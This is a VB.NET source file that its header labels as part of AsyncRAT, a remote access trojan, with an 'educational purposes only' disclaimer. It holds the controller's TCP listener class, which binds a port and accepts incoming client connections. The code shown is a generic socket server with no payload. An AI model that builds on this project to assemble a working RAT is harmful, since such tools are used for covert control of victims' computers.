Imports System.Net.Sockets
Imports System.Net

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class ServerSocket
    Public S As Socket
    Async Sub Start(ByVal Port As Integer)
        S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Dim IpEndPoint As IPEndPoint = New IPEndPoint(IPAddress.Any, Port)

        S.ReceiveBufferSize = 1024 * 500
        S.SendBufferSize = 1024 * 500
        S.Bind(IpEndPoint)
        S.Listen(999)

        Pending.Req = New List(Of Requests)
        Dim T1 As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Pending.Pen))
        T1.Start()

        While True
            Await Task.Delay(1)
            S.BeginAccept(New AsyncCallback(AddressOf EndAccept), S)
        End While

    End Sub

    Sub EndAccept(ByVal ar As IAsyncResult)
        Try
            Dim C As New Client(S.EndAccept(ar))
        Catch ex As Exception
        End Try
    End Sub

End Class
